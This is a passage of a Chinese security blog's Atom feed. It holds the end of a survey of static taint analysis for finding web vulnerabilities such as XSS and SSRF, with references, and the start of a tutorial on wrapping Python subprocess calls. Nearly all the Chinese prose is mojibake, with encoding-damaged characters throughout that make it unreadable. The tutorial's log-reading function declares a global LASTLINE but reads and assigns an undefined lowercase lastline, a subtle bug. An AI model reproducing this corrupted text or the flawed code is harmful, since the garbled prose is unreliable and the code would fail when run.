ä¹‹åï¼Œæ±¡ç‚¹åˆ†ææ³•ä¼šä¸æ•°æ®æµåˆ†æä¸€æ ·ï¼Œå¯¹ç¨‹åºè¿›è¡Œè¿‡ç¨‹å†…åˆ†æå’Œè¿‡ç¨‹é—´åˆ†æã€‚</p><p>è¿‡ç¨‹å†…åˆ†æåŒ…æ‹¬äº†æ˜¾å¼æµåˆ†æå’Œéšå¼æµåˆ†æï¼Œæ˜¾ç¤ºæµåˆ†æå³é€šè¿‡åˆ†æå˜é‡çš„æ•°æ®ä¾èµ–å…³ç³»è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ï¼Œè€Œéšå¼åˆ†æåˆ™æ˜¯æŒ‡è€ƒè™‘æ§åˆ¶ä¾èµ–è¿›è¡Œæ±¡ç‚¹ä¼ æ’­ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200528204252182.png" alt="image-20200528204252182"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé¦–å…ˆå‡è®¾å˜é‡ $a$ ä¸ºæ±¡ç‚¹å˜é‡ï¼Œå®çº¿ç®­å¤´è¡¨ç¤ºäº†æ˜¾ç¤ºæ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼Œè€Œè™šçº¿ç®­å¤´è¡¨ç¤ºäº†éšå¼æ±¡ç‚¹ä¼ æ’­è·¯å¾„ï¼ŒåŒæ—¶è¯¥å›¾ä¹Ÿè¯´æ˜äº†è¿‡ç¨‹å†…æ±¡ç‚¹ä¼ æ’­åŸºæœ¬æ€æƒ³ï¼Œå³ä»ä¸Šè‡³ä¸‹éå†æ•°æ®æµå›¾ï¼Œè‹¥æœªæ ‡è®°çš„å˜é‡ä¾èµ–äºæ±¡ç‚¹å˜é‡ï¼Œåˆ™æ–°å˜é‡ä¹Ÿè¢«æ ‡è®°ä¸ºæ±¡ç‚¹å˜é‡ã€‚è™½ç„¶æ”»å‡»è€…ç¡®å®å¯ä»¥åˆ©ç”¨æ§åˆ¶ä¾èµ–æ“ä½œæ•°æ®è¿›è¡Œæ”»å‡»ï¼Œä½†ç”±äºå…¶åˆ†æå¤æ‚ä¸”ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ï¼Œåœ¨å·¥ç¨‹é¢†åŸŸå¸¸å¸¸åªåšæ•°æ®æµä¾èµ–çš„æ˜¾ç¤ºåˆ†æï¼Œå› æ­¤æœ¬æ–‡ä¸»è¦è®¨è®ºæ˜¾å¼æµåˆ†æã€‚</p><p>ç°ä»£ç¨‹åºå­˜åœ¨ç€å¤æ‚çš„å‡½æ•°è°ƒç”¨ï¼Œé™¤äº†è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œè¿˜éœ€è¦è¿›è¡Œè¿‡ç¨‹é—´åˆ†æã€‚å…¶åˆ†æé¦–å…ˆæ„é€ å‡½æ•°è°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼Œæ¥ç€æœç´¢å­˜åœ¨äº§ç”Ÿç‚¹çš„å‡½æ•°ï¼Œå¯¹äºæ¯ä¸€ä¸ªå­˜åœ¨äº§ç”Ÿç‚¹çš„å‡½æ•°ï¼Œè‡ªé¡¶å‘ä¸‹åˆ†æï¼ˆä¹Ÿå¯ä»¥è‡ªåº•å‘ä¸Šåˆ†æï¼‰ã€‚é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œè·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œè¿›è¡Œè¿‡ç¨‹å†…æ±¡ç‚¹åˆ†æï¼Œå°†åˆ†æç»“æœè¡¨è¾¾ä¸º $\left\langle f, S, r\right\rangle$ çš„å‡½æ•°æ‘˜è¦ï¼Œå…¶ä¸­$f$åŒ…å«å‡½æ•°æœ¬èº«æ‘˜è¦ä¿¡æ¯ï¼ˆç±»åæ–¹æ³•åå’Œå‡½æ•°ç­¾åï¼‰ï¼Œ$S$ æŒ‡è°ƒç”¨è¿‡è¯¥å‡½æ•°åè¢«æ±¡æŸ“çš„å˜é‡é›†åˆï¼Œ$r$ å–å€¼0æˆ–1ï¼Œæ ‡è®°å‡½æ•°è¿”å›å€¼æ˜¯å¦è¢«æ±¡æŸ“ï¼›æ¥ç€æ ¹æ®å‡½æ•°æ‘˜è¦ï¼Œå†è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå¦‚æ­¤å¾€å¤ç›´è‡³åˆ†æå®Œå‡½æ•°æ‰€æœ‰ä»£ç å—æˆ–æ˜¯æ±¡ç‚¹ä¼ æ’­è‡³æ±‡èšç‚¹ï¼ŒæŠ¥å‘Šæ¼æ´ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200528204328041.png" alt="image-20200528204328041"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåˆ†æè¿‡ç¨‹ä»å·¦ä¾§å‡½æ•°å¼€å§‹ï¼Œå› ä¸ºå…¶æ‰¾åˆ°äº†ä¸€å¤„äº§ç”Ÿç‚¹â€”â€”<em>request.getParameter(â€œxssâ€)</em>ï¼Œäºæ˜¯å°†æ±¡ç‚¹ä¼ é€’åˆ°å˜é‡<em>p</em>ï¼Œæ¥ç€è°ƒç”¨å‡½æ•°<em>func(p)</em>ï¼Œäºæ˜¯å¯¹å‡½æ•°<em>func()</em>åšè¿‡ç¨‹å†…åˆ†æï¼Œå¾—åˆ°å…¶å‡½æ•°æ‘˜è¦ï¼Œ $\left\langle func, \left\{a, b, c\right\}, 1\right\rangle$ ï¼Œäºæ˜¯å›åˆ°è°ƒç”¨è€…çš„å‡½æ•°å†…ï¼Œå˜é‡<em>q</em>è¢«æ ‡è®°ä¸ºæ±¡ç‚¹ï¼Œåˆå› ä¸ºç¬¬ä¸‰è¡Œå­˜åœ¨ä¸€å¤„æ±‡èšç‚¹â€”â€”<em>response.getpriter.print()</em>ï¼Œå¹¶ä¸”å‚æ•°ä¸ºæ±¡ç‚¹ï¼Œäºæ˜¯æŠ¥å‘Šæ­¤å¤„æœ‰æ¼æ´ï¼Œå¹¶ä¸”æ ¹æ®æ±‡èšç‚¹å¯ä»¥åˆ¤æ–­è¯¥æ¼æ´æ˜¯ä¸€ä¸ª XSS æ¼æ´ã€‚</p><h2 id="ä¼˜åŠ¿å’Œä¸è¶³"><a href="#ä¼˜åŠ¿å’Œä¸è¶³" class="headerlink" title="ä¼˜åŠ¿å’Œä¸è¶³"></a>ä¼˜åŠ¿å’Œä¸è¶³</h2><p>æ±¡ç‚¹åˆ†æèƒ½å¤Ÿå¯¹ç¨‹åºä¸Šä¸‹æ–‡æœ‰ä¸€å®šç†è§£ï¼Œå¾€å¾€èƒ½äº§ç”Ÿè¯¯æŠ¥ç‡ç›¸å¯¹è¾ƒä½ä»¥åŠå¯è§£é‡Šçš„æ¼æ´æŠ¥å‘Šï¼Œå…¶æ–¹æ³•å¯¹ Web ç±»å‹çš„å®‰å…¨æ¼æ´è¦†ç›–ç‡è¾ƒé«˜ï¼Œè€Œæ±¡ç‚¹ç±»å‹çš„æ¼æ´æ™®éå…·æœ‰è¾ƒé«˜å±å®³æ€§ï¼Œå› æ­¤è¯¥æ–¹æ³•å·²è¢«å¾ˆå¤šå·¥ä¸šç•Œã€å­¦æœ¯ç•Œçš„å®‰å…¨é™æ€æ‰«æå·¥å…·æ‰€ä½¿ç”¨ã€‚</p><p>ç„¶è€Œï¼Œæ±¡ç‚¹ä¼ æ’­ä»æœ‰å¯èƒ½å‘ç”Ÿè¯¯æŠ¥ï¼Œä»¥ä¸‹é€šè¿‡ç®€å•ç¤ºä¾‹æ¥è¯´æ˜ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200530195755514.png" alt="image-20200530195755514"></p><p>é¦–å…ˆï¼Œæ±¡ç‚¹ä¼ æ’­å¯¹å®¹å™¨ç±»å‹æ— æ³•åšå¾ˆå¥½å¤„ç†ï¼Œå¦‚ä¸Šå›¾ (a)æ‰€ç¤ºï¼Œå½“æ±¡ç‚¹ä¼ å…¥ å®¹å™¨ç±»å‹æ—¶ï¼ˆåœ¨æ­¤ä¾‹å­ä¸­ä¸º mapï¼‰ï¼Œé™æ€æ±¡ç‚¹ä¼ æ’­åªèƒ½å°†è¿™ç±»å˜é‡çš„ä¼ æ’­è§„åˆ™è®¾ ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œä»è€Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼Œå°±å¦‚å›¾æ‰€ç¤ºï¼Œè‹¥è®¾ä¸º map ä¼ æ’­æ±¡ç‚¹ï¼Œç”±äºæ¡ˆä¾‹å®é™…ä»å®¹å™¨ä¸­å–å‡ºçš„æ˜¯æ²¡æœ‰æ±¡ç‚¹çš„å˜é‡ï¼Œå³è¿‡æ±¡æŸ“ï¼Œè€Œè‹¥è®¾ä¸ºä¸ä¼ æ’­ï¼Œè‹¥ q å–å‡ºå‚æ•° pï¼Œé‚£ä¹ˆåˆå¯¼è‡´æ¬ æ±¡æŸ“ã€‚åŠ¨æ€æ±¡ç‚¹ä¼ æ’­è™½ç„¶è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œ ä½†æ˜¯ç”±äºå…¶ä½¿ç”¨æ¡ä»¶å¤æ‚ï¼Œä¸”æ— æ³•ç”¨äºé™æ€åˆ†æï¼Œæœ¬æ–‡æš‚ä¸è®¨è®ºã€‚</p><p>æ­¤å¤–ï¼Œä¸è®ºæ˜¯åŠ¨æ€æ±¡ç‚¹ä¼ æ’­è¿˜æ˜¯é™æ€æ±¡ç‚¹ä¼ æ’­ï¼Œå…¶å¯¹æ±¡ç‚¹æ¸…æ´ç‚¹çš„è¯†åˆ«èƒ½åŠ›å‡ ä¹ä¸ºé›¶ï¼Œå¦‚ä¸Šå›¾(b)æ‰€ç¤ºï¼Œè¯¥å‡½æ•°æ˜¯ä¸€ä¸ªå…¸å‹çš„é˜²å¾¡ SQL æ³¨å…¥çš„æ±¡ç‚¹æ¸…æ´ å‡½æ•°ï¼Œå³åœ¨ç¬¬ 2âˆ¼5 è¡Œå¯¹å¾…æ‹¼æ¥ SQL å­—ç¬¦ä¸²å­˜åœ¨çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢å’Œè¿‡æ»¤ï¼Œä½† æ˜¯æ±¡ç‚¹ä¼ æ’­å¹¶ä¸èƒ½è¯†åˆ«è¿™äº›æ¸…æ´å‡½æ•°ï¼Œå¯¼è‡´è¯¯æŠ¥ã€‚</p><p>å†è€…ï¼Œé™æ€æ±¡ç‚¹ä¼ æ’­å¯¹æ§åˆ¶æµæ²¡æ³•åšå¾ˆå¥½çš„å¤„ç†ï¼Œå¦‚ä¸Šå›¾(c)æ‰€ç¤ºï¼Œåœ¨ç¬¬ä¸‰è¡Œï¼Œç¨‹åºå·²ç»å¯¹å¯èƒ½äº§ç”Ÿçš„ SSRF æ¼æ´è¿›è¡Œäº†å¤„ç†ï¼Œå³å¦‚æœæ˜¯å†…éƒ¨åœ°å€åˆ™ç›´æ¥è¿”å›ï¼Œä½†æ˜¯ä¸è®ºæ˜¯è€ƒè™‘æ˜¾å¼æµè¿˜æ˜¯éšå¼æµï¼Œæ±¡ç‚¹ä¼ æ’­éƒ½ä¸èƒ½é¿å…è¿™ä¸€ç±»è¯¯æŠ¥ã€‚</p><p>æœ€åï¼Œå¯¹äºç‰¹æ®Šè§¦å‘æ¡ä»¶çš„æ¼æ´ï¼Œæ±¡ç‚¹ä¼ æ’­æ— æ³•å¾ˆå¥½å¤„ç†ï¼Œå¦‚ä¸Šå›¾(d)æ‰€ç¤ºï¼Œ åœ¨ç¬¬äºŒè¡Œï¼Œå› ä¸º SSRF è¦æ±‚æ”»å‡»è€…èƒ½å¤Ÿæ“æ§ä¸»æœºåï¼Œæ‰€ä»¥å³ä½¿ç”¨æˆ·è¾“å…¥çš„æ±¡ç‚¹å˜é‡æ‹¼æ¥åœ¨ä¸€ä¸ªæ­£å¸¸ä¸»æœºåä¹‹åï¼Œç¨‹åºä¹Ÿä¸ä¼šå‡ºç° SSRF ï¼Œè€ŒæŒ‰ç…§æ±¡ç‚¹ä¼ æ’­åˆ†ææ³•ï¼Œæ¯«æ— ç–‘é—®å®ƒä¼šæŠ¥å‘Šè¿™æ®µç¨‹åºå­˜åœ¨ SSRF æ¼æ´ã€‚</p><p>è¿™äº›é—®é¢˜ä¹Ÿæ˜¯å·¥ä¸šç•Œå’Œå­¦æœ¯ç•ŒäºŸå¾…è§£å†³çš„é—®é¢˜ï¼Œå¦‚å·¥ä¸šç•Œå¼€å§‹å°è¯•ç”¨ç¬¦å·æ‰§è¡Œï¼Œä»¥åŠç”¨é»‘ç›’ã€IASTé…åˆè§£å†³ç™½ç›’ï¼Œåœ¨å­¦æœ¯ç•Œä¹Ÿæ­£å°è¯•ç”¨æœºå™¨å­¦ä¹ è§£å†³é—®é¢˜ã€‚</p><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ol><li>J. M. Schumann, Automated Theorem Proving in Software Engineering, Springer Berlin Heidelberg, Berlin, Heidelberg, 2001.</li><li>C. Flanagan, K. R. M. Leino, M. Lillibridge, G. Nelson, J. B. Saxe, R. Stata, Extended static checking for Java, in: Proceedings of the 2002 ACM SIGPLAN Conference on Programming Language Design and Implementation, Vol. 48, ACM Press, New York, New York, USA, 2002, pp. 234â€“245.</li><li>Y. Xie, A. Aiken, Saturn: A scalable framework for error detection using Boolean satisfiability, ACM Transactions on Programming Languages and Systems 29 (3) (2007) 16</li><li>C. Cadar, K. Sen, Symbolic Execution for Software Testing: Three Decades Later, Communications of the ACM 56 (2) (2013) 82â€“90.</li><li>P. Godefroid, N. Klarlund, K. Sen, DART: directed automated random testing, in: Proceedings of the 2005 ACM SIGPLAN conference on Programming language design and implementation, Vol. 40, ACM Press, New York, New York, USA, 2005, pp. 213â€“223.</li><li>K. Sen, D. Marinov, G. Agha, CUTE: a concolic unit testing engine for C, Proceedings of the 10th European software engineering conference held jointly with 13th ACM SIGSOFT international symposium on Foundations of software engineering 30 (5) (2005) 263.</li><li>C. Cadar, V. Ganesh, P. M. Pawlowski, D. L. Dill, D. R. Engler, EXE: Automatically Generating Inputs of Death, ACM Transactions on Information and System Security 12 (2) (2008) 1â€“38.</li><li>C. Cadar, D. Dunbar, D. Engler, Klee: Unassisted and automatic generation of highÂ­coverage tests for complex systems programs, in: Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation, OSDI 2008, Vol. 8, 2019, pp. 209â€“224</li><li>G. A. Kildall, A unified approach to global program optimization, in: Proceedings of the 1st annual ACM SIGACT SIGPLAN symposium on Principles of programming languages, ACM Press, New York, New York, USA, 1973, pp. 194â€“206.</li><li>B. Shastry, F. Yamaguchi, K. Rieck, J. P. Seifert, Towards Vulnerability Discovery Using Staged Program Analysis, in: Detection of Intrusions and Malware, and Vulnerability Assessment, Springer, Cham, 2016, pp. 78â€“97.</li><li>N. Jovanovic, C. Kruegel, E. Kirda, Pixy: a static analysis tool for detecting Web application vulnerabilities, in: Proceedings of the 2006 IEEE Symposium on Security and Privacy, IEEE, 2006, pp. 258â€“263.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å†™æ¯•è®¾è°ƒæŸ¥èƒŒæ™¯çŸ¥è¯†æ—¶åšçš„ï¼Œåœ¨&lt;a href=&quot;https://www.t00ls.net/thread-56572-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;t00ls&lt;/a&gt;å’Œ&lt;a href=&quot;https://forum.90sec.com/t/topic/1087&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;90sec&lt;/a&gt;å‘è¿‡å¸–å­ï¼Œè¿™é‡Œåšå½’æ¡£ç”¨ã€‚&lt;/p&gt;&lt;h1 id=&quot;è¯æ³•åˆ†ææŠ€æœ¯&quot;&gt;&lt;a href=&quot;#è¯æ³•åˆ†ææŠ€æœ¯&quot; class=&quot;headerlink&quot; title=&quot;è¯æ³•åˆ†ææŠ€æœ¯&quot;&gt;&lt;/a&gt;è¯æ³•åˆ†ææŠ€æœ¯&lt;/h1&gt;&lt;p&gt;è¯æ³•åˆ†ææŠ€æœ¯æ˜¯æœ€ç®€å•çš„ä¸€ç±»æ¼æ´æŒ–æ˜æŠ€æœ¯ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯å°†ä»£ç æ–‡æœ¬ä¸å½’çº³å¥½çš„ç¼ºé™·æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œä»¥æ­¤å‘ç°æ¼æ´ã€‚ç”±äºå…¶ä¸æ·±å…¥åˆ†æç¨‹åºç»“æ„å’Œè¯­ä¹‰ï¼Œå¾€å¾€åªèƒ½æŒ–æ˜è¾ƒä¸ºç®€å•çš„ä¸€ç±»æ¼æ´ï¼Œå¹¶ä¸”å­˜åœ¨ç›¸å½“é«˜çš„è¯¯æŠ¥ç‡ï¼Œåœ¨å®é™…åœºæ™¯ä¸‹åº”ç”¨è¾ƒå°‘ï¼Œä½†ç”±äºå…¶æ€æƒ³ç®€å•ï¼Œé€‚ç”¨æ€§å¾ˆå¹¿ï¼Œç›®å‰ä¹Ÿè¿˜å­˜åœ¨ç±»ä¼¼å·¥å…·ï¼Œå¦‚ï¼š&lt;a href=&quot;https://github.com/MobSF/Mobile-Security-Framework-MobSF&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MobSF&lt;/a&gt;ï¼Œ&lt;a href=&quot;https://github.com/WhaleShark-Team/cobra&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Cobra&lt;/a&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://anemone.top/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
      <category term="æ±¡ç‚¹åˆ†æ" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="å½¢å¼åŒ–åˆ†æ" scheme="http://anemone.top/tags/%E5%BD%A2%E5%BC%8F%E5%8C%96%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨Pythonä¼˜é›…è°ƒç”¨å…¶ä»–å·¥å…·æˆ–å‘½ä»¤</title>
    <link href="http://anemone.top/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/"/>
    <id>http://anemone.top/dev-ä½¿ç”¨Pythonä¼˜é›…è°ƒç”¨å…¶ä»–å·¥å…·æˆ–å‘½ä»¤/</id>
    <published>2020-03-02T07:32:03.000Z</published>
    <updated>2020-03-21T07:51:07.862Z</updated>
    
    <content type="html"><![CDATA[<p>Python å¼€å‘æ‰«æå™¨æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä»–ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œä½†æ˜¯é€šè¿‡ <code>os.system()</code>æˆ–è€…å…¶ä»–å‘½ä»¤ä¸­æ˜¯ä¼šæœ‰è¿™æ ·æˆ–é‚£æ ·çš„å‘æˆ–ä¸è¶³ï¼Œæœ¬æ–‡å¯¹è¿™äº›é—®é¢˜è¿›è¡Œæ€»ç»“å¹¶æå‡ºè§£å†³æ–¹æ¡ˆï¼Œå¹¶åœ¨ç»“å°¾ç»™å‡ºäº†ä¸€ä¸ªå°è£…å¥½çš„ç±»ï¼Œèƒ½è¾ƒä¸ºå®Œç¾çš„è§£å†³Pythonè°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤çš„é—®é¢˜ã€‚</p><h1 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h1><ol><li>é¦–å…ˆï¼Œæˆ‘å¯ä»¥è°ƒç”¨ä»»æ„å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å‘½ä»¤æ‰§è¡Œæ—¶å‘è¾“å…¥é€šé“ï¼ˆstdinï¼‰ä¼ æ›´å¤šè¾“å…¥ï¼ŒåŒæ—¶Pythonèƒ½å®æ—¶è·å–è¾“å‡ºé€šé“ï¼ˆstdoutï¼‰å’Œé”™è¯¯é€šé“ï¼ˆstderrï¼‰è·ç¨‹åºè¾“å‡ºï¼Œæ³¨æ„æ˜¯è·å–è¾“å‡ºï¼Œè€Œä¸æ˜¯å•çº¯çš„å°†è¾“å‡ºé‡å®šå‘åˆ°å±å¹•æˆ–æ–‡ä»¶ä¸­ï¼›</li><li>æˆ‘å¯ä»¥é€šè¿‡è¿”å›å€¼ï¼Œæˆ–è€…ç¨‹åºè¾“å‡ºåˆ¤æ–­ç¬¬ä¸‰æ–¹ç¨‹åºæ‰§è¡Œæ˜¯å¦å‡ºé”™ï¼Œå¦‚æœå‡ºé”™æŠ›å‡ºå¼‚å¸¸æˆ–è€…è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼›</li><li>æ‰§è¡Œå‘½ä»¤æ˜¯æœ€å¥½å¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé˜²æ­¢å­å‘½ä»¤å‡æ­»è€Œå½±å“ä¸»ç¨‹åºï¼›</li><li>è¿™æ®µè°ƒç”¨ç¨‹åºåº”è¯¥æ˜¯è·¨å¹³å°çš„ï¼Œæ¯•ç«ŸPythonæœ¬èº«å°±æ˜¯è·¨å¹³å°è¯­è¨€ã€‚</li></ol><a id="more"></a><h1 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h1><p>çœ‹åˆ°ç¬¬ä¸€æ¡å’Œç¬¬äºŒæ¡éœ€æ±‚ï¼Œé¦–å…ˆæƒ³åˆ°ç”¨ <code>subprocess.Popen()</code> å¯ä»¥å®ç°ï¼Œç¡®å®ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºå®ƒè¿›è¡Œæ”¹é€ ï¼Œå®Œæˆæˆ‘ä»¬çš„ä»»åŠ¡ã€‚</p><p><code>subprocess.communicate()</code> è™½ç„¶å¯ä»¥è®© Python æ‹¿åˆ°ç¨‹åºè¿”å›åˆ°stdoutæˆ–stderrçš„è¾“å‡ºï¼Œä½†æ˜¯å®ƒä¸æ˜¯å®æ—¶çš„ï¼Œè¦æƒ³åšåˆ°å®æ—¶è¾“å‡ºï¼Œé¦–å…ˆå°†stdoutå’Œstderré€šé“é‡å®šå‘åˆ°<code>subprocess.PIPE</code>ï¼Œè¿™é‡Œæ–¹ä¾¿èµ·è§ï¼Œæˆ‘å…ˆå°†stderré€šé“é‡å®šå‘åˆ°stdoutï¼Œå†å°†stdouté‡å®šå‘åˆ°<code>subprocess.PIPE</code>ï¼Œæ³¨æ„å¦‚æœæ˜¯Windowså¹³å°ï¼Œç›´æ¥ä¼ å‘½ä»¤æ˜¯æ²¡æ³•æ‹¿åˆ°æ­£ç¡®çš„ç¨‹åºè¿”å›å€¼çš„ï¼Œå› æ­¤è¦åœ¨åé¢åŠ ä¸Š<code>&amp; exit</code> å‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">    cmd = cmd</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è€ƒè™‘å¦‚ä½•ä»processä¸­æ‹¿æ•°æ®çš„é—®é¢˜ï¼Œè¿™é‡Œä¸€å®šè¦æ–°å¼€ä¸€ä¸ªçº¿ç¨‹å–æ•°æ®ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å­å‘½ä»¤æ‰§è¡Œäº§ç”Ÿå¤§é‡è¾“å‡ºå¡«æ»¡äº†subprocessçš„ç¼“å†²åŒºï¼Œå¯¼è‡´æ•´ä¸ªç¨‹åºé˜»å¡çš„é—®é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log_thread = threading.Thread(target=print_log, args=(process.stdout,))</span><br><span class="line">log_thread.start()</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šçš„ <code>print_log(stdout)</code>å‡½æ•°ç”¨æ¥ä¸æ–­å‘è¾“å‡ºç¼“å†²åŒºå–æ•°æ®ï¼Œå¹¶è¿›è¡Œå…¶ä»–å¤„ç†ï¼Œè¿™é‡Œçš„stdoutç›¸å½“äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä½†æ˜¯å®è·µè¡¨æ˜ä¸èƒ½ç”¨ readline() å’Œreadlines() è¯»æ•°æ®ï¼Œå› ä¸ºç¬¬ä¸‰æ–¹ç¨‹åºè¾“å‡ºæœ‰å¯èƒ½ä¼šç”¨<code>\r</code>åœ¨åŒä¸€è¡Œä¸Šå¤šæ¬¡æ‰“å°è¾“å‡ºï¼ˆå¦‚åœ¨å‘½ä»¤è¡Œæ˜¾ç¤ºè¿›åº¦æ¡çš„åŠæƒ…å†µï¼‰ï¼Œç”¨<code>readlines()</code>æ›´ä¼šé€ æˆç¨‹åºè¿è¡Œæ•ˆç‡æ…¢çš„é—®é¢˜ï¼ˆè°ä¹Ÿä¸æƒ³ä¸€ä¸ªæ—¥å¿—å¤„ç†ç¯èŠ‚æŠŠä¸€ä¸ªæ ¸å¿ƒçš„CPUæ‰“æ»¡å§ï¼Ÿï¼‰ï¼Œå› æ­¤è¯»å–æ—¥å¿—çš„å‡½æ•°åº”è¯¥è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LASTLINE=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">( stdout)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> log_line <span class="keyword">in</span> _log_line_iter(stdout):</span><br><span class="line">        process_line(log_line)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(reader)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> LASTLINE</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> buf:</span><br><span class="line">            <span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            lines[<span class="number">0</span>] = lastline + lines[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">yield</span> line</span><br><span class="line">            lastline = lines[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ <code>read()</code>å‡½æ•°ä»ç¼“å†²åŒºæ‹¿æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡ <code>process_line(log_line)</code> 